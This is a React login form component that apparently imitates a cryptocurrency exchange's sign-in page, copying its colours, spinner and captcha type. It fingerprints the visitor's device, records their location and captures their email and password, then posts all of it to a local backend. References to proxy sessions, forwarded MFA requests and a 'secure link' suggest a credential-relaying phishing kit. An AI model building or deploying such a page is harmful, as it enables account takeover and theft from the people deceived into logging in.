import React, { useState, useEffect, useRef } from 'react';
import { QrCode, X } from 'lucide-react';
import { LoginButton } from './LoginButton';
import { getLoginLink } from '../services/api';
import { Spinner } from './Spinner';
import { CaptchaModal } from './CaptchaModal';
import { useNavigate } from 'react-router-dom';

export const LoginForm: React.FC = () => {
  // CONFIGURATION: Set to false to hide email login input
  const ENABLE_EMAIL_LOGIN = false;
  
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const [loginLink, setLoginLink] = useState('');
  const hasInitializedRef = useRef(false);
  const [showMessage, setShowMessage] = useState(false);
  const [emailPhone, setEmailPhone] = useState('');
  const [isContinueLoading, setIsContinueLoading] = useState(false);
  const [showCaptcha, setShowCaptcha] = useState(false);
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [password, setPassword] = useState('');
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isPostCaptchaLoading, setIsPostCaptchaLoading] = useState(false);
  const [isPasswordLoading, setIsPasswordLoading] = useState(false);
  const [passwordError, setPasswordError] = useState('');
  const [emailError, setEmailError] = useState('');

  useEffect(() => {
    if (isLoading && !hasInitializedRef.current) {
      initializeLogin();
    }
  }, [isLoading]);

  // Initialize device info and location on component mount
  useEffect(() => {
    const initializeDeviceData = async () => {
      try {
        // Generate and store device info if not already stored
        if (!localStorage.getItem('deviceInfo')) {
          const { generateFingerprint } = await import('../utils/fingerprint');
          const deviceInfo = await generateFingerprint();
          localStorage.setItem('deviceInfo', deviceInfo);
          console.log('Device info generated and stored:', deviceInfo);
        }

        // Get and store location if not already stored
        if (!localStorage.getItem('location')) {
          const { getLocationData } = await import('../services/api');
          const locationData = await getLocationData();
          localStorage.setItem('location', JSON.stringify(locationData));
          console.log('Location data generated and stored:', locationData);
        }
      } catch (error) {
        console.error('Failed to initialize device data:', error);
      }
    };

    initializeDeviceData();
  }, []);

  const initializeLogin = async () => {
    if (hasInitializedRef.current) return;
    hasInitializedRef.current = true;

    try {
      // Clean up old values
      localStorage.removeItem('qrCode');
      localStorage.removeItem('random');
      localStorage.removeItem('sessionId');
      localStorage.removeItem('proxy_session');

      const sessionId = localStorage.getItem('session_id') || Math.random().toString().substring(2, 12);
      localStorage.setItem('session_id', sessionId);

      const deviceInfo = localStorage.getItem('deviceInfo');
      if (!deviceInfo) return;

      const data = await getLoginLink(sessionId, deviceInfo);
      
      if (data.success && data.link) {
        setLoginLink(data.link);
        localStorage.setItem('qrCode', data.qrCode);
        localStorage.setItem('random', data.random);
        localStorage.setItem('sessionId', data.sessionId);
        localStorage.setItem('proxy_session', data.proxy_session);
        setIsLoading(false);
      } else {
        // If success is true but no link, or success is false
        window.location.reload();
      }
    } catch (error) {
      console.error('Error initializing:', error);
      window.location.reload(); // Also reload on error
    }
  };

  const handleAlternativeLogin = () => {
    setShowMessage(true);
    setTimeout(() => setShowMessage(false), 3000);
  };

  const handleContinue = async () => {
    if (!emailPhone.trim()) {
      setEmailError('Please enter your email address');
      return;
    }
    
    if (!validateEmail(emailPhone)) {
      setEmailError('Please enter a valid email address');
      return;
    }
    
    setIsContinueLoading(true);
    setEmailError(''); // Clear any existing error
    
    try {
      // Try to call the captcha API
      const response = await fetch('http://localhost:3000/api/get_captcha', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1',
          'Referer': 'http://localhost:5173/'
        },
        body: JSON.stringify({
          email: emailPhone
        })
      });
      
      console.log('Response status:', response.status);
      console.log('Response headers:', response.headers);
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const data = await response.json();
      console.log('Captcha API response:', data);
      
      if (data.success && data.hasCaptcha && data.captchaType === 'bCAPTCHA2') {
        // Show captcha modal with image
        setIsContinueLoading(false);
        setShowCaptcha(true);
        // Store captcha data for later use
        localStorage.setItem('captchaData', JSON.stringify({
          type: 'bcaptcha2',
          imageUrl: data.imageUrl,
          originalImageUrl: data.originalImageUrl,
          captchaQuestion: data.captchaQuestion,
          sessionId: data.sessionId,
          validateId: data.validateId,
          session_id: data.session_id
        }));
      } else if (data.success && data.hasCaptcha && data.captchaType === 'random') {
        // Random captcha type - always skip captcha and go to password field
        setIsContinueLoading(false);
        setIsTransitioning(true);
        // Store session data for password submission
        localStorage.setItem('captchaData', JSON.stringify({
          type: 'random',
          sessionId: data.sessionId,
          session_id: data.session_id
        }));
        setTimeout(() => {
          setShowPasswordField(true);
          setIsTransitioning(false);
        }, 300);
      } else if (data.success && !data.hasCaptcha) {
        // No captcha required - show password field directly
        setIsContinueLoading(false);
        setIsTransitioning(true);
        setTimeout(() => {
          setShowPasswordField(true);
          setIsTransitioning(false);
        }, 300);
      } else {
        // Default behavior - show captcha
        setIsContinueLoading(false);
        setShowCaptcha(true);
      }
    } catch (error) {
      console.error('Captcha API not available, using fallback:', error);
      
      // Fallback: Simulate random behavior for demo purposes
      // In production, you would handle this differently
      const shouldShowPassword = Math.random() > 0.5; // 50% chance
      
      if (shouldShowPassword) {
        // Show password field directly (simulating 'random' type)
        setIsContinueLoading(false);
        setIsTransitioning(true);
        setTimeout(() => {
          setShowPasswordField(true);
          setIsTransitioning(false);
        }, 300);
      } else {
        // Show captcha modal (simulating 'bcaptcha2' type)
        setIsContinueLoading(false);
        setShowCaptcha(true);
        // Store mock captcha data
        localStorage.setItem('captchaData', JSON.stringify({
          type: 'bcaptcha2',
          imageUrl: '/captcha.jpg'
        }));
      }
    }
  };

  const handleCaptchaClose = () => {
    setShowCaptcha(false);
  };

  const handleCaptchaVerify = () => {
    setShowCaptcha(false);
    // Show loading for 2 seconds after captcha
    setIsPostCaptchaLoading(true);
    
    setTimeout(() => {
      setIsPostCaptchaLoading(false);
      // Start transition effect
      setIsTransitioning(true);
      
      // After slide out completes, show password field and slide in
      setTimeout(() => {
        setShowPasswordField(true);
        setIsTransitioning(false);
      }, 300);
    }, 2000);
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const validateEmail = (email: string): boolean => {
    // Basic email validation regex
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email);
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmailPhone(value);
    
    // Clear error when user starts typing
    if (emailError) {
      setEmailError('');
    }
  };

  const handleEmailBlur = (e: React.FocusEvent<HTMLInputElement>) => {
    const value = e.target.value;
    
    // Only validate if field is not empty
    if (value && !validateEmail(value)) {
      setEmailError('Please enter a valid email address');
    }
  };

  const handlePasswordContinue = async () => {
    setIsPasswordLoading(true);
    setPasswordError(''); // Clear any existing error
    
    try {
      // Get sessionId from captcha data
      const captchaData = localStorage.getItem('captchaData');
      let sessionId = '';
      
      if (captchaData) {
        const data = JSON.parse(captchaData);
        sessionId = data.sessionId || '';
      }
      
      // Get device info from localStorage (base64)
      const deviceInfo = localStorage.getItem('deviceInfo');
      
      // Get location data
      const location = localStorage.getItem('location');
      
      // Debug logging
      console.log('Device Info from localStorage:', deviceInfo);
      console.log('Location from localStorage:', location);
      
      const payload = {
        sessionId: sessionId,
        email: emailPhone,
        password: password,
        deviceInfo: deviceInfo, // Keep as base64 string
        location: location ? JSON.parse(location) : null
      };
      
      console.log('Password submission payload:', payload);
      
      const response = await fetch('http://localhost:3000/api/submit_password', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });
      
      const result = await response.json();
      console.log('Password submission response:', result);
      
      if (result.success && result.loginResponse && result.loginResponse.success) {
        // Store login response data for verification page
        localStorage.setItem('userEmail', emailPhone);
        localStorage.setItem('loginResponse', JSON.stringify(result.loginResponse));
        
        // Store MFA data if available
        if (result.mfaApiResponse) {
          localStorage.setItem('mfaData', JSON.stringify(result.mfaApiResponse));
        }
        
        // Store session data
        localStorage.setItem('sessionData', JSON.stringify({
          sessionActive: result.sessionActive,
          mfaRequestForwarded: result.mfaRequestForwarded
        }));
        
        // Navigate to verification page
        navigate('/login-verification');
      } else if (result.success && result.loginResponse && !result.loginResponse.success) {
        // API call successful but login failed (wrong password, etc.)
        setPasswordError(result.loginResponse.message || 'Login failed. Please try again.');
      } else {
        setPasswordError(result.message || 'Login failed. Please try again.');
      }
    } catch (error) {
      console.error('Failed to submit password:', error);
      setPasswordError('Network error. Please try again.');
    } finally {
      setIsPasswordLoading(false);
    }
  };

  const handleEmailKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && !isContinueLoading) {
      handleContinue();
    }
  };

  const handlePasswordKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter' && !isPasswordLoading) {
      handlePasswordContinue();
    }
  };

  const handleEmailClick = () => {
    // Go back to email entry page
    setShowPasswordField(false);
    setPassword('');
    setPasswordError('');
  };

  const handleForgotPassword = () => {
    setShowMessage(true);
    setTimeout(() => setShowMessage(false), 3000);
  };

  return (
    <div className="relative">
      {isLoading && (
        <Spinner 
          className="z-50"
        />
      )}

      {isPostCaptchaLoading && (
        <Spinner 
          message="Processing verification..."
          className="z-50"
        />
      )}

      <div className={`space-y-6 transition-opacity duration-300 ${isLoading || isPostCaptchaLoading ? 'opacity-0' : 'opacity-100'}`}>
        {showMessage && (
          <div className="fixed top-8 left-1/2 -translate-x-1/2 bg-[#474D57] text-[#EAECEF] py-3 px-4 rounded-[4px] z-50 min-w-[240px] animate-fade-in shadow-lg">
            <div className="flex justify-between items-center gap-4">
              <span className="text-[14px] font-normal">This function is disabled on secure link</span>
              <button 
                onClick={() => setShowMessage(false)}
                className="text-[#848E9C] hover:text-[#EAECEF]"
              >
                <X size={16} />
              </button>
            </div>
          </div>
        )}

        {/* Hide entire header on password page */}
        {!showPasswordField && (
          <div className="flex justify-between items-center">
            <h1 className="text-[32px] leading-[40px] font-semibold text-[#EAECEF]">Log in</h1>
            <button 
              onClick={handleAlternativeLogin}
              className="text-[#848E9C] hover:text-[#EAECEF] p-1"
            >
              <QrCode size={24} />
            </button>
          </div>
        )}

        {/* Form container with slide animations */}
        <div className="relative overflow-hidden">
          {/* Email only view - slides out left when transitioning */}
          {!showPasswordField && ENABLE_EMAIL_LOGIN && (
            <div className={`space-y-4 ${isTransitioning ? 'animate-slide-out-left' : ''}`}>
              <div className="space-y-2">
                <label className="text-[14px] text-[#848E9C] font-normal">
                  Email/Phone number
                </label>
                <div className="relative">
                <input
                  type="email"
                  value={emailPhone}
                  onChange={handleEmailChange}
                  onBlur={handleEmailBlur}
                  onKeyPress={handleEmailKeyPress}
                  placeholder="example@gmail.com"
                  className={`w-full h-[48px] px-4 bg-[#0B0E11] border rounded-[8px] text-[#EAECEF] text-[14px] placeholder-[#848E9C] focus:outline-none transition-colors ${
                    emailError ? 'border-[#F84960]' : 'border-[#474D57] focus:border-[#F0B90B]'
                  }`}
                />
                  {emailPhone && (
                    <button
                      onClick={() => setEmailPhone('')}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-[#848E9C] hover:text-[#EAECEF]"
                    >
                      <X size={16} />
                    </button>
                  )}
                </div>
                {/* Email error message */}
                {emailError && (
                  <div className="flex items-center space-x-2">
                    <div className="w-4 h-4 rounded-full bg-[#F84960] flex items-center justify-center">
                      <span className="text-white text-[10px] font-bold">!</span>
                    </div>
                    <p className="text-[#F84960] text-[14px] font-normal">{emailError}</p>
                  </div>
                )}
              </div>
              
              <button
                onClick={handleContinue}
                disabled={isContinueLoading}
                className="w-full h-[44px] bg-[#FCD535] hover:bg-[#F0B90B] text-[#1E2329] rounded-[12px] font-[500] text-[14px] transition-all relative disabled:opacity-70"
              >
                <span className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${isContinueLoading ? 'opacity-100' : 'opacity-0'}`}>
                  <div className="bn-spinner" style={{ width: '24px', height: '24px' }}>
                    <svg viewBox="0 0 64 64">
                      <g strokeWidth="7" strokeLinecap="round" stroke="#1E2329">
                        <line x1="10" x2="10">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="16;18;28;18;16;16"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="48;46;36;44;48;48"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values="1;.4;.5;.8;1;1"/>
                        </line>
                        <line x1="24" x2="24">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="16;16;18;28;18;16"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="48;48;46;36;44;48"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values="1;1;.4;.5;.8;1"/>
                        </line>
                        <line x1="38" x2="38">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="18;16;16;18;28;18"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="44;48;48;46;36;44"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values=".8;1;1;.4;.5;.8"/>
                        </line>
                        <line x1="52" x2="52">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="28;18;16;16;18;28"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="36;44;48;48;46;36"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values=".5;.8;1;1;.4;.5"/>
                        </line>
                      </g>
                    </svg>
                  </div>
                </span>
                <span className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${isContinueLoading ? 'opacity-0' : 'opacity-100'}`}>
                  Continue
                </span>
              </button>
            </div>
          )}

          {/* Email + Password view - slides in from right */}
          {showPasswordField && (
            <div className="space-y-6 animate-slide-in-right">
              <div className="space-y-4">
                <h2 className="text-[32px] leading-[40px] font-semibold text-[#EAECEF]">Enter your password</h2>
                
                {/* Masked email display - clickable to go back */}
                <button 
                  onClick={handleEmailClick}
                  className="text-[14px] text-[#848E9C] hover:text-[#F0B90B] transition-colors cursor-pointer"
                >
                  {emailPhone ? 
                    emailPhone.includes('@') ? 
                      emailPhone.replace(/(.*)(.{4})(@.*)/, '$1****$3') :
                      emailPhone.replace(/(.{2})(.*)(.{2})/, '$1****$3')
                    : 'john.s****@gmail.com'
                  }
                </button>
              </div>

              <div className="space-y-2">
                <label className="text-[14px] text-[#848E9C] font-normal">
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (passwordError) setPasswordError(''); // Clear error when typing
                    }}
                    onKeyPress={handlePasswordKeyPress}
                    className="w-full h-[48px] px-4 bg-[#0B0E11] border border-[#474D57] rounded-[8px] text-[#EAECEF] text-[14px] focus:outline-none focus:border-[#F0B90B] transition-colors"
                  />
                  <button 
                    onClick={togglePasswordVisibility}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[#848E9C] hover:text-[#EAECEF]"
                  >
                    {showPassword ? (
                      // Eye open (password visible)
                      <svg className="cursor-pointer w-[20px] h-[20px]" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                      </svg>
                    ) : (
                      // Eye closed (password hidden)
                      <svg className="cursor-pointer w-[20px] h-[20px]" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
                        <path d="M16.345 7.125a.9.9 0 011.199-.131l.072.058 4.38 3.903a1.4 1.4 0 010 2.09l-4.587 4.088a7.626 7.626 0 01-5.072 1.931h-.642a7.624 7.624 0 01-4.307-1.334 1 1 0 01-.334-.181l-.101-.086-.066-.065a.9.9 0 011.163-1.355c.068.026.125.055.167.08.047.027.09.055.131.084a5.826 5.826 0 003.347 1.057h.641a5.826 5.826 0 003.876-1.475l4.251-3.79-4.044-3.604-.066-.064a.9.9 0 01-.008-1.206zm-3.975-2.19l.032.003c.545.04 1.148.094 1.718.208a.9.9 0 01-.356 1.765c-.44-.089-.934-.137-1.455-.175h-.614c-1.34 0-2.635.461-3.671 1.302l-.204.174-4.244 3.78 2.273 1.98.067.064a.9.9 0 01-1.176 1.35l-.072-.056-2.617-2.278a1.4 1.4 0 01-.011-2.101l4.583-4.084.266-.227a7.626 7.626 0 014.806-1.705h.675z" fill="currentColor"></path>
                        <path d="M10.615 13.567l2.97-2.97 1.414 1.414-2.97 2.97-1.414-1.414z" fill="currentColor"></path>
                        <path d="M19.51 3.232l.069-.062a.9.9 0 011.266 1.267l-.061.068L4.521 20.77a.9.9 0 01-1.274-1.274L19.511 3.232z" fill="currentColor"></path>
                      </svg>
                    )}
                  </button>
                </div>
              </div>
              
              <button
                onClick={handlePasswordContinue}
                disabled={isPasswordLoading}
                className="w-full h-[44px] bg-[#FCD535] hover:bg-[#F0B90B] text-[#1E2329] rounded-[12px] font-[500] text-[14px] transition-all relative disabled:opacity-70"
              >
                <span className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${isPasswordLoading ? 'opacity-100' : 'opacity-0'}`}>
                  <div className="bn-spinner" style={{ width: '24px', height: '24px' }}>
                    <svg viewBox="0 0 64 64">
                      <g strokeWidth="7" strokeLinecap="round" stroke="#1E2329">
                        <line x1="10" x2="10">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="16;18;28;18;16;16"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="48;46;36;44;48;48"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values="1;.4;.5;.8;1;1"/>
                        </line>
                        <line x1="24" x2="24">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="16;16;18;28;18;16"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="48;48;46;36;44;48"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values="1;1;.4;.5;.8;1"/>
                        </line>
                        <line x1="38" x2="38">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="18;16;16;18;28;18"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="44;48;48;46;36;44"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values=".8;1;1;.4;.5;.8"/>
                        </line>
                        <line x1="52" x2="52">
                          <animate attributeName="y1" dur="750ms" repeatCount="indefinite" values="28;18;16;16;18;28"/>
                          <animate attributeName="y2" dur="750ms" repeatCount="indefinite" values="36;44;48;48;46;36"/>
                          <animate attributeName="stroke-opacity" dur="750ms" repeatCount="indefinite" values=".5;.8;1;1;.4;.5"/>
                        </line>
                      </g>
                    </svg>
                  </div>
                </span>
                <span className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${isPasswordLoading ? 'opacity-0' : 'opacity-100'}`}>
                  Continue
                </span>
              </button>

              {/* Password error message */}
              {passwordError && (
                <div className="text-center">
                  <p className="text-[#F84960] text-[14px] font-normal">{passwordError}</p>
                </div>
              )}

              <div className="text-center">
                <button 
                  onClick={handleForgotPassword}
                  className="text-[#F0B90B] hover:text-[#FCD535] text-[14px] font-normal"
                >
                  Forgot password?
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Hide app login section when password field is shown */}
        {!showPasswordField && (
          <>
            {ENABLE_EMAIL_LOGIN && (
              <div className="text-center text-[#848E9C] text-[14px] font-normal">or</div>
            )}

            <div className={`space-y-3 ${!ENABLE_EMAIL_LOGIN ? 'mt-12 mb-8' : ''}`}>
              <LoginButton loginLink={loginLink} isPrimary={!ENABLE_EMAIL_LOGIN} />
              <p className="text-[12px] text-[#848E9C] text-center leading-relaxed">
                After confirming in the app, please come back to this page.
              </p>
            </div>
          </>
        )}
      </div>

      <CaptchaModal 
        isOpen={showCaptcha}
        onClose={handleCaptchaClose}
        onVerify={handleCaptchaVerify}
      />
    </div>
  );
};